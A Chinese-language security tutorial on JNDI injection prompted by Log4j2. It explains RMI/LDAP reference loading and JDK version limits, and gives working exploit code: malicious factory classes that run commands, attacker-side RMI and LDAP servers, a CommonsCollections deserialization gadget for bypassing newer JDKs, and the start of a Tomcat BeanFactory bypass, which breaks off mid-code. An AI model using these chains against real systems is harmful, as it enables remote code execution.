0x0 JNDI入门指北
============

前言
--

log4j2 宛如过年一般，趁此机会对没理清的 JNDI 协议仔细再捋一捋

log4j的payload很好记：`${jndi:ldap/rmi://xxxxxx/exp}`

那么，我们就需要研究一下是怎么来的。

首先来看rpc

0x1 RPC
=======

RPC即 `Remote Procedure Call`（远程过程调用），==是一种技术思想而并非一种规范的协议==，是一种通过网络从远程计算机请求服务的过程。

常见 RPC 技术和框架有：

- 应用级的服务框架：阿里的 Dubbo/Dubbox、Google gRPC、Spring Boot/Spring Cloud。
- 远程通信协议：RMI、Socket、SOAP(HTTP XML)、REST(HTTP JSON)。
- 通信框架：MINA 和 Netty。

一个rpc框架有以下必备条件：传输协议，序列化，注册中心，服务路由，负载均衡，IO框架，心跳机制，服务鉴权，服务隔离，服务治理，监控埋点。

- Dubbo：国内最早开源的 RPC 框架，由阿里巴巴公司开发并于 2011 年末对外开源，仅支持 Java 语言。
- Motan：微博内部使用的 RPC 框架，于 2016 年对外开源，仅支持 Java 语言。
- Tars：腾讯内部使用的 RPC 框架，于 2017 年对外开源，仅支持 C++ 语言。
- Spring Cloud：国外 Pivotal 公司 2014 年对外开源的 RPC 框架，仅支持 Java 语言
- gRPC：Google 于 2015 年对外开源的跨语言 RPC 框架，支持多种语言。
- Thrift：最初是由 Facebook 开发的内部系统跨语言的 RPC 框架，2007 年贡献给了 Apache 基金，成为 Apache 开源项目之一，支持多种语言。

0x2 联系
======

先直接给出结论

`Spring Cloud是一种RPC框架，但是区别是它使用的是http协议的传输，整体技术和普通RPC如dubbo/thrift有很大区别，所以一般会分开说。`

而Springcloud的核心是微服务，微服务中使用 RPC的思想尤为明显

我们熟知的一些漏洞，能够远程加载恶意类的，或多或少都有着使用微服务架构的影子，所以我们才需要对这一领域进行研究。

![img](https://pic3.zhimg.com/v2-cade4fe83bffcb193c05c68f63990c2e_b.jpg)

使用场景
----

- 在分布式场景中，我们一般要考虑调用问题
- 远程过程调用，要能够像本地过程调用一样方便，让使用者感受不到远程调用的逻辑
- rpc的过程图
    
    ![img](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2018.cnblogs.com%2Fblog%2F1009724%2F201909%2F1009724-20190918170851529-1634452001.png&refer=http%3A%2F%2Fimg2018.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643940372&t=ea8df0dfd0d97632c93a32d97dd5252f)
- RPC：(Remote Procedure call) 即远程过程调用，它是一个计算机通信协议，RPC与语言无关
- RMI：(Remote Method Invocation) 远程方法执行，是RPC的纯java实现方式

简单来说，就是一个节点请求另一个节点的服务

1. 服务端需要暴露一个接口 (让客户端知道服务端有哪些可以请求的服务)
2. 客户端需要把调用方法名，参数都传递到服务端
3. 服务端接收客户端发来的方法名和参数，在自己的服务中找到对应的方法，然后去调用
4. 服务器端把结果发送到客户端

通过网络传输字符串，对象等数据，使用时常伴随着序列化使用。

但是，光看这样，无法理解其中的细节，我们需要深入看一下RPC的架构

![image.png](https://s3.bmp.ovh/imgs/2022/02/65f8d5455d2c8563.png)

在一个典型 RPC 的使用场景中，包含了服务发现、负载、容错、网络传输、序列化等组件，其中“RPC 协议”就指明了程序如何进行网络传输和序列化。

0x3 微服务
=======

参考文章：<https://www.jianshu.com/p/7293b148028f>

这里先谈一下微服务，什么是微服务

1. 微服务是系统架构上的一个风格，主旨是将一个原本独立的系统拆分成多个小型服务
2. 这些小服务能够在各自独立的进程中运行，服务之间通过HTTP的 Restful API进行通信协作。

![img](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fwww.d8jd.com%2FPublic%2Fuploads%2F201802%2F15183252168565.png&refer=http%3A%2F%2Fwww.d8jd.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643961705&t=2dac9932ea7dc73a23d5eba67959a390)

比方说，一个服务里面，就有一个`apache + database`，

被拆分成的每一个小型服务都围绕着系统中的某一项或一些耦合度较高的业务功能进行构建，并且每个服务都维护着自身的数据存储、业务开发、自动化测试案例以及独立部署机制。

为什么要使用微服务
---------

微服务架构有别于更为传统的单体式方案，可将应用拆分成多个核心功能。==每个功能都被称为一项服务，可以单独构建和部署，这意味着各项服务在工作（和出现故障）时不会相互影响==。这有助于您更好实现 DevOps 的技术，让持续集成和持续交付(CI/CD)\[软件构造的知识点\]更加利于实现。

按照官方的说法，实施微服务需要有：服务组件化，按业务阻止团队，做产品的态度，==轻量化的通信机制==，去中心化处理数据，去中心化管理数据，基础设施自动化，容错测试，容错设计，演进式设计。

其中，我们攻击具有JNDI漏洞的业务时，大部分是从轻量化的通信机制中入手的。

这里以微服务 zookeeper为例，看一下微服务的过程

![img](https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fstatic.zybuluo.com%2Fzhangnian88123%2Fs1glz9ip0513b06uyqs18rxp%2FQQ%25E6%2588%25AA%25E5%259B%25BE20160406183124.jpg&refer=http%3A%2F%2Fstatic.zybuluo.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643940871&t=2bfc85956cde9f3f996630d4fb78fec5)

那么，我们伪造一个 微服务中间的服务器，类似于伪造JDBC反序列化漏洞中mysql服务端一样，让客户端访问恶意的服务器去加载数据，就可以达到我们的目的。

### 关于jdk版本的问题

师傅们经过测试，log4j给出了可以打的一些环境版本

总结是：`rmi 113之前可以用， ldap 191之前可以用`

```java
8u112 rmi可以利用

8u112 ldap可以利用

8u121 rmi失败

8u121 ldap可以利用

8u181 rmi失败

8u181 ldap可以利用

8u191 rmi失败

8u191 ldap失败

8u301 rmi失败

8u301 ldap失败

11.012 rmi失败

11.012 ldap失败
```

那么，为什么191和113是一个分水岭呢？
---------------------

我们先来分析一个例子

### LDAP+JNDI远程加载恶意类

ldap的jndi在==6u211、7u201、8u191、11.0.1==后也将默认的`com.sun.jndi.ldap.object.trustURLCodebase`设置为了false，并且这些变动对应的分配了一个漏洞编号CVE-2018-3149。

这就是为什么师傅们说到191之后就不再适用了，因为如果我们想要在191之后的版本进行使用ldap进行加载恶意类，需要我们手动去设置参数`com.sun.jndi.ldap.object.trustURLCodebase`设置为`true`

具体可以见 Vulfocus 靶场环境

```php
docker pull vulfocus/log4j2-rce-2021-12-09:latest 
```

中有代码这么写道

使用 docker copy 命令将 `demo.jar`拷贝到主机进行反编译

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212121439.png)

可以看到师傅在jdk版本不满足的情况下设置了属性为 true

接下来，我们以一张图来理清思路

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212122707.png)

### JNDI

`JNDI(Java Naming and Directory Interface)`是Java提供的`Java 命名和目录接口`。通过调用`JNDI`的`API`应用程序可以定位资源和其他程序对象。`JNDI`是`Java EE`的重要部分，需要注意的是它并不只是包含了`DataSource(JDBC 数据源)`，`JNDI`可访问的现有的目录及服务有:`JDBC`、`LDAP`、`RMI`、`DNS`、`NIS`、`CORBA`。

JNDI如上很多协议，但是我们这里只分析 LDAP和RMI

### LDAP目录服务

LDAP全称是轻量级目录访问协议。

LDAP的服务处理工厂类是:com.sun.jndi.ldap.LdapCtxFactory，连接LDAP之前需要配置好远程的LDAP服务。

### RMI

RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。

远程加载恶意类(攻击服务端)
--------------

### RMI服务端远程加载恶意类

根据p师傅知识星球的内容可知rmi进行加载的时候，会涉及到`codebase`，codebase是一个地址，指定`jvm`从哪个地方去搜集类，和ClassPath，jdbc的url一样，通常是远程的URL，比如http,ftp等

如果我们指定`codebase=http://example.com`，然后加载`org.vulhub.example.Example`类，则宿主机上的jvm将会去下载`http://example.com/org.vulhub.example/Example.Class`，并作为要加载类的字节码。

在RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。

所以，我们只要控制了`codebase`，就可以加载任何恶意类。

在RMI中，我们是可以将`codebase`随着序列化的数据一起传输的，服务器在接受到数据后，就会去ClassPath和指定的codebase去寻找类。

#### 满足条件

因此，官方在注意到后，在后面的版本加了限制，满足如下条件的才可以攻击

1. 安装并配置了`SecurityManager`，(需要自己设置为trust)
2. java.rmi.server.useCodebaseOnly 配置为 flase，如果为 true，则将禁用自动加载类文件，不允许远程加载对象

> java在6u45、7u21，8u121，开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。

### RMI+JNDI远程加载恶意类

最典型的是 fastjson rmi+jndi注入。

被引用的ObjectFactory对象还将受到`com.sun.jndi.rmi.object.trustURLCodebase`配置限制，如果该值为false(不信任远程引用对象)则无法调用远程的引用对象。

> rmi的jndi在6u132，7u122，8u113 开始 `com.sun.jndi.rmi.object.trustURLCodebase`默认值已改为了false。
> 
> `com.sun.jndi.rmi.object.trustURLCodebase`、  
> `com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为false

### LDAP+JNDI远程加载恶意类

还是 fastjson ldap+jndi注入

> ldap的jndi在6u211、7u201、8u191、11.0.1后也将默认的`com.sun.jndi.ldap.object.trustURLCodebase`设置为了false

### JNDI注入之 rmi+jndi

如果我们再RMI服务端绑定一个恶意的引用对象，RMI 客户端在获取服务端绑定的对象的时候，发现是一个Reference对象后，检查当前JVM是否允许 (基于 trustURLCodebase)加载远程引用的对象，如果允许加载 Reference且本地不存在对象工厂类，则使用 URLClassLoader 加载远程的jar，去加载我们构建的恶意对象工厂(ReferenceeObjectFactory)类，然后调用其中的`getObjectInstance`方法从而触发方法中恶意RCE代码。

所以，如果当前RMI客户端允许加载远程调用的对象，且RMI服务端绑定的是`Referrnce`恶意对象，则可以进行RMI攻击

#### 服务端

上面也说到了，对于jdk版本过高的，需要手动开启`trustURLCodebase=true`，不开启的话会提示`The Object factory is untrusted`

==这里说的下面的demo会提到==

#### RMI

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212171126.png)

```java
RMI demo
```

```php
列举几个函数

bind：将远程对象绑定到注册中心
rebind：重新绑定一个远程对象
unbind：取消一个过程对象的绑定
list：列出注册中心绑定对象
lookup：在注册中心获取一个远程对象的存根
```

#### 服务端与注册中心

JRMP：客户端，服务端，注册中心三者之间的通信协议称为 JRMP协议

下面对一些常用的操作进行概括

**服务端与注册中心**

```java
Registry registry = LocateRegistry.getRegistry(1099);
//默认是1099端口
registry.bind(....);
```

通过`getRegistry`方法获取到的其实是一个`RegistryImpl_Stub`的代理对象，其中封装了注册中心的一些TCP信息，用于与之发起请求

### JNDI注入前置

#### 客户端

JNDI有多种命名/目录提供的形式，所以客户端要`IntialContext`类来获取初始目录环境

```java
String url = "rmi://localhost:1099/hello";
InitialContext context = new InitialContext();
context.lookup(url);
```

JNDI会根据 url 的形式来动态解析，比如对于以RMI形式提供的服务，url就可以写成`rmi://{ip}:{port}/{name}`；对于LDAP的服务，url就可以写成 `ldap://{ip}:{port}/{name}`

#### JNDI注入的根--Reference

`Reference：在JNDI服务中允许使用系统以外的对象，比如在某些目录服务中直接引用远程的Java对象，但遵循一些安全限制`

对于不存在命令/目录范围内的对象，可以通过 Reference类来绑定一个外部的远程连接对象(一般以字节码形式通过http服务托管)，客户端可以通过lookup方法找到这个远程对象，获取相应的factory，然后通过factory将 reference转化成对象。

JNDI允许通过对象工厂(java.naming.spi.ObjectFactory)动态加载对象实现，例如，当查找绑定在名称空间中的打印机时，如果打印服务将打印机的名称绑定到`Reference`，则可以使用该打印机 Reference创建一个打印机对象，从而查找的调用者可以在查找后直接在该打印机对象上操作。

==对象工厂必须实现 javax.naming.spi.ObjectFactory 接口，并且重写 getObjectInstance方法==

所以我们这里就可以自己实现一个OjbectFactory接口的类，并重写getObjectInstance方法

```java
public class ReferenceObjectFactory implements ObjectFactory {
    /**
     * @param obj  包含可在创建对象时使用的位置或引用信息的对象（可能为 null）。
     * @param name 此对象相对于 ctx 的名称，如果没有指定名称，则该参数为 null。
     * @param ctx  一个上下文，name 参数是相对于该上下文指定的，如果 name 相对于默认初始上下文，则该参数为 null。
     * @param env  创建对象时使用的环境（可能为 null）。
     * @return 对象工厂创建出的对象
     * @throws Exception 对象创建异常
     */
    public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?, ?> env) throws Exception {
        // 在创建对象过程中插入恶意的攻击代码，或者直接创建一个本地命令执行的Process对象从而实现RCE
        return Runtime.getRuntime().exec("calc");
    }
```

**主要原理：JNDI Reference 远程加载Object Factory类的特性**

```java
Reference(String name)
    为类名为"name"的对象构造一个新的应用
Reference(String name , RefAddr addr)
    为类型为"name"的对象和地址构造一个新引用
Reference(String name, ReAddr addr, String factory,String factoryLocation)
    为类名为"name"的对象，对象工厂的类名和为止以及对象的地址构造一个新的引用
Reference(String name,String factory,String factoryLocation)
    为类名为"name"的对象以及对象工厂的类名和位置构造一个新的应用
```

通过RMI来绑定一个Reference对象

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Test {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        String referenceUrl="http://localhost:9999";
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("refer","fefer",referenceUrl);
        ReferenceWrapper refer = new ReferenceWrapper(reference);
        registry.bind("refer",refer);
    }
}
```

> 为什么需要`ReferenceWrapper`包装呢？
> 
> 被Registry绑定的对象必须继承UnicastRemoteObject类，而Reference类并没有实现这个类，所以无法被直接绑定

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212154638.png)

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211212154716.png)

JNDI注入8u191↓
------------

通常JNDI注入攻击都是 lookup方法的执行者，一般步骤如下：

1. 目标机器调用了`InitialContext.lookup("URL")`，且URL为用户可控
2. 攻击者控制这个URL为一个恶意的RMI服务地址：`rmi://{ip}/{port}/name`
3. 恶意RMI服务会返回一个含有恶意factory的Reference对象
4. 目标获取Reference之后会动态加载factory
5. 攻击者可以在恶意factory的静态代码块，构造方法写入恶意代码，在目标实例化factory的时候被RCE

当然，通常会有两种实现方式：LDAP和RMI

### RMI（8u121）

我们先创建一个恶意的类，让服务器托管这个恶意的类

```java
import java.io.IOException;

public class Exp {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

```

使用javac进行编译，放置于服务器

这里要注意一下，要用低版本的jdk进行编译，如果用高版本jdk编译会出现如下问题

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216102905.png)

当我换了jdk进行编译(jdk版本更换工具推荐 jevn)

然后编写Server端的代码

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference =  new Reference("Exp","Exp","http://127.0.0.1:8000/");
        ReferenceWrapper calc = new ReferenceWrapper(reference);
        registry.bind("calc",calc);
    }
}

```

编写客户端代码

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class clinet {
    public static void main(String[] args) throws NamingException {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        InitialContext context = new InitialContext();
        context.lookup("rmi://127.0.0.1:1099/calc");
    }
}

```

如果客户端lookup方法参数可控的话，命令就可以执行成功，可以被RCE

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216103047.png)

### 分析

在此处打上断点进行调试

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216172905.png)

前几步是从Server端解析传入的URL，到 这一步 RegistryContexr#lookup的方法,

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216170918.png)

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211216170835.png)

我们可以看到`this.registry`仍然是`RegistryImpl_Stub`，执行`lookup`方法获取的是一个`ReferenceWrapper_Stub`对象，

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217124236.png)

在`RegistryContext#decodeObject`方法中会根据这个ReferenceWrapper\_Stub对象获取Reference对象

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217124528.png)

跟进getReference方法,发现调用了UnicastRef#invoke ⽅法

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217125350.png)

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218210218.png)

相当于进⾏了⼀次远程⽅法调⽤（⻅ RMI 中 的 "Client 发送请求"），⽽调⽤的⽅法为

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218211834.png)

正好对应着 RMI 服务端中的 ReferenceWrapper#getReference ⽅法（ReferenceWrapper 实现了 RemoteReference 接⼝）：

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211217125847.png)

于是这次远程⽅法调⽤的结果就是返回了远程 ReferenceWrpper 包装的 Reference 对象：

(条件运算符前面成立，返回前面得表达式)

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218212149.png)

继续跟代码，来到 NamingManager#getObjectInstance ⽅法，跟到`NamingManager##getObjectFactoryFromReference`方法获取factory实例

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218214023.png)

跟了以后发现，首先进行本地加载，加载失败以后，再从codebase加载factory

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218215814.png)

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218220020.png)

其中，下面的LoadClass加载方式为 URLClassLoader，成功加载了恶意代码

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218221857.png)

最后返回factory实例

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218213933.png)

### 修复

在 8U121之后，默认的RMI利用方式不再信任codebase

我这里以 8u181为例

在`RegistryContext#<static>`（末尾处）新增代码

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218222425.png)

在 `RegistryContext#decodeObject`处

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218222552.png)

LDAP方式
------

与RMI方式一样，使用marshalsec开启ldap服务

```java
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalec.jndi.LDAPRefServer http://127.0.0.1:8000/#Exp
```

### 简单分析

```JAVA
getObjectFactoryFromReference:142, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
```

最后仍然是调⽤了 NamingManager#getObjectFactoryFromReference ⽅法。

### 修复

8u281版本

同上，跟到NamingManager##getObjectFactoryFromReference 方法的loadClass进去之后，会判断trustURLCodebase,长按ctrl+左键

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218230949.png)

会跳到 `VersionHelper12`中，这个类默认将其定位 false

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211218231306.png)

JNDI注入 8u191↑
-------------

高版本的绕过思路有两种：

1. LDAP Server直接返回恶意序列化数据，但是需要目标环境存在Gadget依赖
2. 使用本地的Factory绕过(主要利用了`org.apache.naming.factory.BeanFactory`类)

### 直接返回序列化数据(LDAP)

LDAP Server可以直接改参考marshalsec，修改里面的内容

```java
package demo2;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import demo2.utils.CommonUtil;
import demo2.utils.Utils;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

/**
 * LDAP server implementation returning JNDI references
 *
 * @author mbechler
 *
 */
public class LDAPServer {

    private static final String LDAP_BASE = "dc=example,dc=com";
    static byte[] getCommonsCollections6(){
        TemplatesImpl templates = Utils.createTemplates("Calc.class");
        Transformer invokerTransformer = new InvokerTransformer("getClass", null, null);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, templates);
        HashMap expMap = new HashMap();
        expMap.put(tiedMapEntry, "value");
        outerMap.clear();
        CommonUtil.setFieldValue(invokerTransformer, "iMethodName",
                "newTransformer");
        return CommonUtil.serialize(expMap);
    }

    public static void main ( String[] args ) {
//        int port = 1389;
//        if ( args.length < 1 || args[ 0 ].indexOf('#') < 0 ) {
//            System.err.println(LDAPServer.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
//            System.exit(-1);
//        }
//        else if ( args.length > 1 ) {
//            port = Integer.parseInt(args[ 1 ]);
//        }

        String[] tmpArgs = new String[]{"http://127.0.0.1:7777/#Exp"};
        int port=8888;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(tmpArgs[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;
        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

其中的Utils类为创建一个模板类，然后设置其属性，其实还是CC链那一套，为了避免冗杂，另分开写

```java
package demo2.utils;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.lang.reflect.Field;

public class Utils {

    public static void setFieldValue(Object obj, String field, Object value) throws Exception {
        Class<?> clazz = Class.forName(obj.getClass().getName());
        Field field1 = clazz.getDeclaredField(field);
        field1.setAccessible(true);
        field1.set(obj, value);
    }

    public static TemplatesImpl creatTemplatesImpl(Class payloadClass) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payloadClass));
        CtClass clazz = pool.get(payloadClass.getName());
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] bytecodes = clazz.toBytecode();
        // templatesImpl
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "pwn");
        setFieldValue(templates, "_bytecodes", new byte[][]{bytecodes});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }

}
```

### 其他注意事项

执行的恶意类模块必须放在 static里面执行，放在main函数里面是执行不了的。

```java
package demo2;

import java.io.IOException;

public class Test {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        System.out.println(1);
    }
}

```

### 分析

本质上虽然是利用了LDAP，但是实际上却是利用了序列化的数据。

先看调用链

> 注：我一开始使用的版本是 8u282，调的时候总感觉有些问题，和师傅们调的不一样，后来换了8u202好点了。虽然8u282也能顺下来，但因为jdk版本升级，底层变动，其实路子还是相对比较复杂了。因为8u282调的时候，一开始不是lookup方法，所以比较难理解。人生建议选择低版本jdk，否则回怀疑人生

```java
(ObjectInputStream#readObject --> ... --> Runtime.getRuntime.exec('calc'))
deserializeObject:528, Obj (com.sun.jndi.ldap)
decodeObject:239, Obj (com.sun.jndi.ldap)
c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:8, JNDIClient (JNDI.bypass1)
```

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211229143751.png)

在其中的`JAVA_ATTRIBUTES`中，我们可以看到其定义

```java
static final String[] JAVA_ATTRIBUTES = new String[]{"objectClass", "javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", "javaReferenceAddress", "javaClassNames", "javaRemoteLocation"};
```

这里的`var0`是LDAP服务器端发送给`Attributes`(我们可控)，所以我们可以在服务器端把这个属性与恶意的类进行绑定

在我们构造的LDAPServer中，我们把`JAVA_Attributes`中的`javaSerializeData`进行一个绑定。

```java
e.addAttribute("javaSerializedData", getCommonsCollections6());
```

然后进行直接进行反序列化。

![](https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211229164212.png)

### 本地Factory绕过(RMI)

==稍微有些苛刻==

在 Reference 类中的 factory Class，要求实现 ObjectFactory 接⼝，

在 "NamingManager#getObjectFactoryFromReference" ⽅法中的逻辑是这样的：

1. 优先本地加载factory，这就要求factoryClass在 本地的Classpath中
2. 本地加载不会从codebase中加载，但是由于⾼版本 jdk 默认不信任 codebase，在⼀般情况 下⽆法利⽤
3. 在加载完 factory 之后会强制类型转换为 javax.naming.spi.ObjectFactory 接⼝类型， 之后调⽤ factory.getObjectInstance() ⽅法

所以，如果找可以利用的factory就满足以下要求：

- 在目标的ClassPath中，且实现了 javax.naming.spi.ObjectFactory 接⼝
- 其 getObjectInstance ⽅法可以被利⽤

这个可⽤的 factory 类为 org.apache.naming.BeanFactory ，位于 tomcat 的依赖包中，此 外，这个 factory 绕过需要搭配 javax.el.ELProcessor 来完成 RCE，依赖：

```xml
<dependency>
<groupId>org.apache.tomcat</groupId>
<artifactId>tomcat-catalina</artifactId>
<version>8.5.0</version>
</dependency>
<!-- 加载ELProcessor时需要 -->
<dependency>
<groupId>org.apache.tomcat.embed</groupId>
<artifactId>tomcat-embed-el</artifactId>
<version>8.5.0</version>
</dependency>

```

分析
--

来到`BeanFactory#getObjectInstance`方法中，(太长省略)

这里的代码逻辑比较复杂，简单可以概括为以下几点：

1. `BeanFactory#getObjectInstance` 要求传入Referrnce必须为`ResourceRef`的实例
2. `BeanFactory`通过反射创建了一个bean，这个Bean的类名，属性，属性值都来自于`Reference`，我们可控。
3. 在注入Bean的属性的时候，会调用对应的setter方法。这个setter方法不一定要是`set...`，我们通过`ResourceRef`对象中的`forceString`，可以把任意的`public`方法转换为该属性的`setter`方法。
4. 这个方法的参数类型必须是`String.class`

我们可以利用的方法为`javax.el.ELProceor#eval`方法，可以执行任意EL表达式

```java
package demo03;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
